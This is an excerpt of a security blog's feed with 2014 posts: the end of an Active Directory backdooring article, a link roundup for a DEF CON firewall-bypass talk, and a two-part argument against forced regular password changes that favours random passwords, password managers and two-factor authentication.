/&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://blogs.microsoft.com/cybertrust/2013/06/03/microsoft-releases-new-mitigation-guidance-for-active-directory/&quot; target=&quot;_blank&quot;&gt;AD explorer tool to diff AD&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.ntdsxtract.com/downloads/ntdsxtract/ntds_forensics.pdf&quot; target=&quot;_blank&quot;&gt;NTDS forensics&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://bitbucket.org/iwseclabs/bta&quot; target=&quot;_blank&quot;&gt;BTA&lt;/a&gt; (thx to Sn0rkY)&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;Lessons learned&lt;/h3&gt;But guess what, not all of these problems are solved by rebuilding the AD. One has to rebuild all the computers from scratch as well. Which seems quite impossible. When someone is creating a new AD, it is impossible not to migrate some configuration/data/files from the old domain. And whenever this happens, there is a risk that the new AD will be backdoored as well.&lt;br /&gt;&lt;br /&gt;Ok, we are doomed, but what can we do? I recommend proper log analysis, analyze trends, and detect strange patterns in your network. Better spend money on these, than on the domain rebuild. And when you find something, do a proper incident response. And good luck!&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;Ps: Thanks to Andrew, EQ, and Tileo for adding new ideas to this post.&lt;br /&gt;&lt;br /&gt;Check out the &lt;a href=&quot;https://jumpespjump.blogspot.hu/2015/05/many-ways-of-malware-persistence-that.html&quot; target=&quot;_blank&quot;&gt;host backdooring&lt;/a&gt; post as well! :)&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>Bypass hardware firewalls</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/bypass/defcon/firewall/2014/11/09/Bypass-hardware-firewalls.html"/>
   <updated>2014-11-09T23:56:53+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/bypass/defcon/firewall/2014/11/09/Bypass-hardware-firewalls</id>
   <content type="html">&lt;p&gt;This is just a collection of links about my DEF CON 22 presentation, and the two tools I released:&lt;/p&gt;

&lt;p&gt;Slides:
&lt;a href=&quot;http://www.slideshare.net/bz98/defcon-22-bypass-firewalls-application-white-lists-secure-remote-desktops-in-20-seconds&quot; target=&quot;_blank&quot;&gt;http://www.slideshare.net/bz98/defcon-22-bypass-firewalls-application-white-lists-secure-remote-desktops-in-20-seconds&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Tools:
&lt;a href=&quot;https://github.com/MRGEffitas/Write-into-screen&quot; target=&quot;_blank&quot;&gt;https://github.com/MRGEffitas/Write-into-screen&lt;/a&gt;
&lt;a href=&quot;https://github.com/MRGEffitas/hwfwbypass&quot; target=&quot;_blank&quot;&gt;https://github.com/MRGEffitas/hwfwbypass&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Presentation video from Hacktivity:
&lt;a href=&quot;https://www.youtube.com/watch?v=KPJBckmhtZ8&quot; target=&quot;_blank&quot;&gt;https://www.youtube.com/watch?v=KPJBckmhtZ8&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Technical blog post:
&lt;a href=&quot;https://blog.mrg-effitas.com/bypass-hardware-firewalls-def-con-22/&quot; target=&quot;_blank&quot;&gt;https://blog.mrg-effitas.com/bypass-hardware-firewalls-def-con-22/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Have fun!&lt;/p&gt;

&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/hwfwbypass2B(1).jpg&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/hwfwbypass2B(1).jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/hwfwbypass2B(1).jpg&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;

</content>
 </entry>
 
 <entry>
   <title>Change passwords regularly - a myth and a lie, don't be fooled, part 2</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/complexity/password/security/2014/10/13/Change-passwords-regularly-a-myth-and-a-lie,-don't-be-fooled,-part-2.html"/>
   <updated>2014-10-13T13:47:54+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/complexity/password/security/2014/10/13/Change-passwords-regularly---a-myth-and-a-lie,-don't-be-fooled,-part-2</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;In the &lt;a href=&quot;http://jumpespjump.blogspot.hu/2014/10/change-passwords-regularly-myth-and-lie.html&quot; target=&quot;_blank&quot;&gt;previous blog post&lt;/a&gt;, I have covered the different passwords you have to protect, the attackers and attack methods. Now let's look at how we want to solve the issue. &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;Password requirements&lt;/h2&gt;
&lt;div style=&quot;&quot;&gt;So far we have learned we have to use long, complex, true random passwords. In theory, this is easy.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Now, this is my password advice for 2014:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Password character classes&lt;/b&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Use upper-lower-digit-special characters in general cases.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;If you don't understand what I just write, choose from this:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789-=[];'\,./&amp;lt;&amp;gt;?:&quot;|{}_+!@#$%^&amp;amp;* ()`~&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;If you are a CISO, and say: use 3 out of 4 character class, everyone will use Password12 or Welcome12 as their password (after the 12th enforced password change).&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Password length&lt;/b&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;This is basically the only thing which changes whether the password is in the very high/high/medium/low level. Check the previous blog post for the details about very high/high/medium/low level.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Password length: Very high level class (including work-related/enterprise passwords)&lt;/b&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;15 character (or 20 if you are really paranoid). Making true random passwords longer than 20 characters usually does not make any sense, even in high security scenarios (e.g. military, spy agencies, etc.). 15 character in Windows environment is a right choice, as LM hash is incompatible with 15 character passwords, thus one (effective) attack won't work. Beware, there might be bugs with using 15 character passwords, with a low probability.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Password length: High-level&lt;/b&gt;&lt;b&gt; class&lt;/b&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;12 character, upper-lower-special characters&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;
&lt;/b&gt;&lt;b&gt;Password length: &lt;/b&gt;&lt;b&gt;Medium class&lt;/b&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;10 character, upper-lower-special characters, still &lt;a href=&quot;http://www.gergely.risko.hu/debian-dsa1571/random4.jpg&quot; target=&quot;_blank&quot;&gt;TRUE random&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Password length: Low-level&lt;/b&gt;&lt;b&gt; class&lt;/b&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;9 character. Why less?&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Pin codes&lt;/b&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Always choose the longest provided, but a maximum of 8. Usually, more is pretty impractical.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Password randomness&lt;/b&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;True random, generated by a (local) computer. Avoid Debian. Avoid random generated by your brain. Do not use l33tsp33k. Do not append or prepend the current month, season or year to a word. Do not use Star Wars/Star Trek/(your favorite movie/series here) characters or terminology. In general, avoid any pattern like the above ones. The chances that a true random password generator generates SkyWalker12 is very-very low. And believe me, it is not that hard to crack those. Every algorithm that you would come up with; the bad guys have already thought of it. Use true random. Let the computer do it for you. See details later in this post.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Password history&lt;/b&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Never-ever reuse passwords. NEVER!&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Password change period&lt;/b&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;If it is not enforced otherwise, don't bother to change it twice in a year. But! Check if the password cracking speed made your current ones obsolete. If yes, change the obsolete passwords. Immediately change the password if you have been notified that the service you use has been compromised. Immediately change all of your recently used passwords if you suspect malware was running on your computer (do this on a known clean computer). Immediately change your password if you have used it on a computer you don't own, or there is a small chance malware is running on it. Change it if you really had to give your password to someone. Otherwise, goodbye regular password change. We will miss you...&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;If you are a CISO, and writing security policies, you should have to enforce the password change period based on: do you allow LM hashes? What is the password length requirement for users and administrators? What is the current hash cracking speed, and the forecast for the next 2 years? I think people would be happy to increase their passwords with 1-2 characters, if they are not forced to change it frequently (e.g. every month).
&lt;span style=&quot;font-size: small;&quot;&gt;&lt;span style=&quot;font-weight: normal;&quot;&gt;Now after I was sooo smart giving advises people still hate to implement, let's see the practical implementations. At least some people might like me, because I told them not to change the passwords regularly. Next time someone tells you to change all your important passwords regularly, put a lie detector on him, and check if he changes all of his passwords regularly. If he lies, feel free to use the &lt;a href=&quot;http://xkcd.com/538/&quot; target=&quot;_blank&quot;&gt;wrench algorithm&lt;/a&gt; to crack his passwords. If he was not lying, call 911, to put a straitjacket on him.&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size: small; font-weight: normal;&quot;&gt; Only insane paranoid people do that in reality. Others are just too scared to say &quot;what everyone recommended so far is bullshit&quot;. Comments are welcome ;) Other people might hate me for telling them using true random passwords. Don't panic, keep reading.&lt;/span&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;And don't forget to use 2 factor authentication. It might seem a bit of an overkill at the beginning, but after months, you won't notice using it.&lt;/div&gt;
&lt;h2&gt;(Bad and good) solutions&lt;/h2&gt;
&lt;div&gt;&lt;h3&gt;I will use the same password everywhere&lt;/h3&gt;&lt;div&gt;This is a pretty bad idea. If one of the passwords are compromised, either the attackers can access your other sites, or you have to change all of your passwords. There are better ways to spend your life on earth than changing all of your passwords.

&lt;h3&gt;I will remember it&lt;/h3&gt;&lt;div&gt;Good luck remembering 250 different, complex passwords. Don't forget to change them regularly! ;)&lt;/div&gt;
&lt;h3&gt;I will use the password recovery all the time&lt;/h3&gt;&lt;div&gt;Not a very user-friendly solution. And because the security answer has to be as complicated as the password itself, the problem has not been solved.&lt;/div&gt;
&lt;h3&gt;I will write it down into my super-secret notebook and put it in my drawer&lt;/h3&gt;&lt;div&gt;Although it might work in some cases, it won't work in others. I don't recommend it.

&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/interior.jpg&quot; src=&quot;https://z6543.github.io/_img/interior.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/interior.jpg&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;
&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/monitor.jpg&quot; src=&quot;https://z6543.github.io/_img/monitor.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/monitor.jpg&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;
&lt;/div&gt;&lt;div&gt;
&lt;/div&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;I will use an algorithm, like a base password, and add the websites first letters to the end of the password&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;Still better than using the same password everywhere, but believe me, if this is a targeted attack, it is not that hard to guess your password generation algorithm.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;I will use the advice from XKCD, and use the password correcthorsebatterystaple&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;Still a lot better than simple passwords, but &lt;a href=&quot;http://nakedsecurity.sophos.com/2012/03/19/multi-word-passphrases/&quot; target=&quot;_blank&quot;&gt;unfortunately, people are still bad at choosing random words with random order&lt;/a&gt;, so it is not the best solution. And again, you can't memorize 250 different passwords ... Even 10 is impossible. Only use this method in special corner cases (see details later), and use a passphrase generator!&lt;/div&gt;&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;I will use a &lt;u&gt;password manager&lt;/u&gt;&lt;/h3&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;This is the very first good idea. It solves the problem of remembering 250 different complex and random passwords. Some people might complain about using a password manager, here are those complaints. And my answers:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;u&gt;If someone gets access to this one password store, all is lost.&lt;/u&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Answer&lt;/b&gt;: If someone accessed your password store, and the master password, you can be pretty damn sure that most of your passwords are already stolen. For extra paranoids, you can use multiple password stores, one for daily use, one for rare cases. Beware not to forget the password for the second one ;)&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;u&gt;What if I don't have access to the password store when I need it?&lt;/u&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Answer&lt;/b&gt;: In the age of cheap notebooks, tablets, and smartphones, in 99% of the cases you should not use that important password on any other device than yours. In the rare cases when you must, you can use either your smartphone to get the password, or use a browser extension like &lt;a href=&quot;https://chrome.google.com/webstore/detail/pawhash/adgekjfphhgngpdoklolpjenmgneobfg&quot; target=&quot;_blank&quot;&gt;Password hasher&lt;/a&gt; to generate different passwords to different websites, with one password. For extra paranoids, you can have different master passwords for the different security levels. And don't forget to change the password after you are back at your own computer.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;u&gt;What if I forgot the one password to the password store?&lt;/u&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Answer&lt;/b&gt;: If you use your password manager daily, it has the same odds to forget that one password as it is to forget every one of your passwords.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;u&gt;Password managers make phishing attacks easier.&lt;/u&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Answer&lt;/b&gt;: Who started this nonsense? Good password managers decrease the risk of phishing.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;u&gt;Password managers have the same vulnerabilities as other websites or software.&lt;/u&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Answer&lt;/b&gt;: Well, this is &lt;a href=&quot;http://devd.me/papers/pwdmgr-usenix14.pdf&quot; target=&quot;_blank&quot;&gt;partially true&lt;/a&gt;. There are at least 3 types of password managers, from most secure to least: offline, browser built-in, online. Online password managers give better user experience, with a sacrifice in security. But if you choose one of the leading password managers, and you are a simple home user, the risks are negligible. If you try to store your work password in an online password store, you might violate your internal security policy. For paranoids, use offline password managers, and back them up regularly. If you choose an online password manager, at least use 2-factor authentication. And don't forget, your Chrome password can be easily synchronized to the cloud, shifting it to the online category.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;u&gt;In some cases, like Full Disc Encryption, OS login, smartphone login, or password manager login, the auto-type of password from the password manager is not available, thus choosing a true random password is a pain in the a$$.&lt;/u&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Answer&lt;/b&gt;: True. Generate pronounceable passwords or passphrases in these corner cases, e.g. with the Linux tool apg you can generate pronounceable passwords. For easy and fast type, don't use capital letters (only lower-alpha - digit - special) in the original password, but increase the length of the password. Add 1 extra character because you don't use upper case letters, add 3 other because it is a pronounceable password, and you are good to go. For extra paranoids change one or two of the letters to uppercase where it is convenient. &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;apg -M SNL -m 15 is your friend.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;If you want to check what I write here (always a good idea), test the entropy of a true random 10 character password with all character classes, and check it with 14 characters, without uppercase. I recommend KeePass for that. If you comment on this that &quot;Keepass can not measure that it is a pronounceable password, thus the entropy is lower in reality&quot;, my answer is: &quot;Check out the current passwords used by users, and current password advises, and tell me if this password is a lot better or not ...&quot; . You have been warned.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;  &lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/pronouncable.png&quot; src=&quot;https://z6543.github.io/_img/pronouncable.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/pronouncable.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;For the high-level password class, I don’t recommend anything your brain generated. There are also suitable &lt;a href=&quot;http://pwgen-win.sourceforge.net/&quot; target=&quot;_blank&quot;&gt;offline passphrase generators&lt;/a&gt;. Use at least 5-6 words for passphrases.&lt;/p&gt;

&lt;div style=&quot;&quot;&gt;&lt;u&gt;Password managers are not user-friendly, it takes more time to log in.&lt;/u&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Answer&lt;/b&gt;: If you set auto-type/auto-fill, and the password manager is opened once a day (and you lock your computer when you leave it), in this case, logging in takes less time than typing it! It is more convenient to use it, rather than typing the passwords every time.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;u&gt;I like to create new unique passwords every time I create a new account, and password managers take the fun away from it.&lt;/u&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Answer&lt;/b&gt;: &lt;a href=&quot;http://janrain.com/about/newsroom/press-releases/online-americans-fatigued-by-password-overload-janrain-study-finds/&quot; target=&quot;_blank&quot;&gt;Said no one, ever!&lt;/a&gt; &quot;38 percent of people think it sounds more appealing to tackle household chores – from folding the laundry to scrubbing toilets – than to try and come up with another new user name or password.&quot;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;To summarize things. Use a password manager.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;h2&gt;General advise&lt;/h2&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Never use your essential passwords on other computers. They might be infected with a password stealer. If you really have to use it, change the password as soon as possible on a trusted (your) computer.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Don't fool yourself by phishing sites. If you go to the local flea market, and there is a strange looking guy with &quot;Superbank deposit here&quot; logo above his head, will you put your money?&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Protect yourself against malware. Use a recent operating system, and even if you use OSX or Linux, it is not a bad thing to have an AV as a &quot;last line of defense&quot;. Or to check your pendrive for Windows USB worms.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Never-ever use online web sites to &quot;generate your password&quot;, &quot;measure the complexity of your password&quot; or &quot;check if it has been breached&quot;. Never! (Except if it is your password manager :) ... )

Update: Sign up on the https://haveibeenpwned.com/ for notification if your e-mail is found in a leak.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Changing passwords frequently is bad advice. It is not effective. Put more energy in other right password advise. &lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>Change passwords regularly - a myth and a lie, don't be fooled, part 1</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/password/security/2014/10/01/Change-passwords-regularly-a-myth-and-a-lie,-don't-be-fooled,-part-1.html"/>
   <updated>2014-10-01T13:49:47+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/password/security/2014/10/01/Change-passwords-regularly---a-myth-and-a-lie,-don't-be-fooled,-part-1</id>
   <content type="html">&lt;p&gt;TL;DR: different passwords have different protection requirements, and different attackers using various attacks can only be prevented through different prevention methods. Password security is not simple. For real advise, checking the second post (in progress).&lt;/p&gt;

&lt;p&gt;Are you sick of password advices like “change your password regularly” or “if your password is password change it to pa$$w0rd”? This post is for you!&lt;/p&gt;

&lt;p&gt;The news sites are full of password advises nowadays due to recent breaches. When I read/watch &lt;a href=&quot;https://www.youtube.com/watch?v=qz5i171h_no&quot; target=&quot;_blank&quot;&gt;these advise (especially on CNN&lt;/a&gt;), I am usually pissed off for a lot of reasons. Some advises are terrible (&lt;a href=&quot;https://xato.net/passwords/the-worst-password-tips/&quot; target=&quot;_blank&quot;&gt;a good collection is here&lt;/a&gt;), some are good but without solutions, and others are better, but they don’t explain the reasons. Following is my analysis of the problem. It works for me. It might not work for you. Comments are welcome!&lt;/p&gt;

&lt;h2&gt;Password history&lt;/h2&gt;
&lt;p&gt;Passwords have been used since &lt;a href=&quot;http://en.wikipedia.org/wiki/Password#History_of_passwords&quot; target=&quot;_blank&quot;&gt;ancient times&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/15f1ae857ca97193ffff8102ffffd524.jpg&quot; src=&quot;https://z6543.github.io/_img/15f1ae857ca97193ffff8102ffffd524.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/15f1ae857ca97193ffff8102ffffd524.jpg&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;Because it is simple. When I started using &lt;a href=&quot;http://seriesandtv.com/wp-content/uploads/2013/06/the-internet.png&quot; target=&quot;_blank&quot;&gt;the Internet&lt;/a&gt;, I believe I had three passwords. Windows login, webmail, and IRC. Now I have ~250 accounts/passwords to different things, like to my smartphone, to my cable company (this password can be used to change the channels on the TV), to my online secure cloud storage, to full disk encryption to start my computer, &lt;strike&gt;to my nude pictures&lt;/strike&gt;, to my WiFi router, to my cloud server hosting provider, etc etc etc. My money is protected with passwords, my communication is protected with passwords/encryption, my work is protected with passwords. It is pretty damn important. But yet people tend to choose lame passwords. Pretty lame ones. Because they don’t think it can be significant. But what is not essential today will be relevant tomorrow. The service you used to download music (iTunes) with the lame password will one day protect all your Apple devices, where attackers can download your backup files, &lt;a href=&quot;http://www.wired.com/2012/08/apple-amazon-mat-honan-hacking/all/&quot; target=&quot;_blank&quot;&gt;erase all your devices&lt;/a&gt;, etc. &lt;a href=&quot;http://lukenotricks.blogspot.nl/2010/03/8-characters-long-and-include-at-least.html&quot; target=&quot;_blank&quot;&gt;The seven-character and one capital rule is not enough anymore.&lt;/a&gt; This advice is like PDF is safe to open, Java is secure. Old, outdated, untrue.&lt;/p&gt;

&lt;p&gt;Now, after this lengthy prologue, we will deep dive into the analysis of the problem, by checking what we want to protect, against whom (who is the attacker), and only after that, we can analyze the solutions. Travel with me, I promise it will be fun! ;)&lt;/p&gt;

&lt;h2&gt;What to protect?&lt;/h2&gt;
&lt;div&gt;There are different services online, and various services need different ways to protect. You don't use the same lock on your &lt;a href=&quot;https://www.youtube.com/watch?v=EJOIjQJAL30&quot; target=&quot;_blank&quot;&gt;Trabant&lt;/a&gt; as you do on your &lt;a href=&quot;https://www.youtube.com/watch?v=j82VKi8NNsM&quot; target=&quot;_blank&quot;&gt;BMW&lt;/a&gt;.

&lt;/div&gt;
&lt;div&gt;&lt;h3&gt;Internet banking, online money&lt;/h3&gt;&lt;div&gt;For me, this is the most vital service to protect. Luckily, most of the internet banking services use two-factor authentication (2FA), but unfortunately, not all of them offer &lt;a href=&quot;http://en.wikipedia.org/wiki/Transaction_verification&quot; target=&quot;_blank&quot;&gt;transaction authorization/verification&lt;/a&gt; with complete transactions. 2FA is not effective against malware, it just complicates the attack. Transaction authorization/verification is better, but not perfect (see &lt;a href=&quot;http://www.kaspersky.com/about/news/virus/2011/Teamwork_How_the_ZitMo_Trojan_Bypasses_Online_Banking_Security&quot; target=&quot;_blank&quot;&gt;Zitmo&lt;/a&gt;). If the access is not protected with 2FA, better choose the best password you have (long, real random, sophisticated, but we will get to this later). If it is protected with 2FA, it is still no reason not to use the best password ;) This is what I call the &quot;very high-level password&quot; class.

&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/one-does-not-simply_trust_paypal.png&quot; src=&quot;https://z6543.github.io/_img/one-does-not-simply_trust_paypal.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/one-does-not-simply_trust_paypal.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;&lt;h3&gt;Credit card data&lt;/h3&gt;&lt;/div&gt;
&lt;div&gt;This system is pretty &lt;strike&gt;fucked up&lt;/strike&gt; bad. Something has to be secret (your credit card number), but in the meantime that is the only thing to identify your credit card. It is like your username is your password. Pretty bad idea, huh? The problem is even worse with a &lt;a href=&quot;https://twitter.com/mikko/status/236355251966468096&quot; target=&quot;_blank&quot;&gt;lot of different transaction types&lt;/a&gt;, especially when the hotel asks you to fax both sides of your CC to them. Unfortunately, you can't change the password on your credit card, as there is no such thing, but &lt;a href=&quot;http://en.wikipedia.org/wiki/3-D_Secure&quot; target=&quot;_blank&quot;&gt;Verified by VISA or 3-D Secure&lt;/a&gt; with 2FA might increase the chances your credit card won't get hacked. And on a side note, I have removed the CVV numbers from my credit/debit cards. I only read it once from the card when I received it, I don't need it anymore to be printed there.
And sometimes, &lt;a href=&quot;https://twitter.com/NeedADebitCard&quot; target=&quot;_blank&quot;&gt;you are your own worst enemy.&lt;/a&gt; Don't do stupid things like this:

&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/BgUWxYLCYAEkMQ6.jpg&quot; src=&quot;https://z6543.github.io/_img/BgUWxYLCYAEkMQ6.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/BgUWxYLCYAEkMQ6.jpg&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt;Work related passwords (e.g. Windows domain)&lt;/h3&gt;
&lt;div&gt;This is very important, but because the attack methods are a bit different, I created this as a different category. Details later.

&lt;/div&gt;
&lt;h3&gt;Email, social sites (Gmail/Facebook/Twitter), cloud storage, online shopping&lt;/h3&gt;
&lt;div&gt;This is what I call the &quot;high level password&quot; class.&lt;/div&gt;
&lt;div&gt;Still, pretty important passwords. Some people don't understand &quot;why would attackers put any energy to get his Facebook account?&quot; It is simple. For money. They can use your account to spread spam all over your Facebook wall. They can write messages to all of your connections and tell them you are in trouble and send money via Western Union or Bitcoin.

&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/facebook-scam-travel1.jpg&quot; src=&quot;https://z6543.github.io/_img/facebook-scam-travel1.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/facebook-scam-travel1.jpg&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
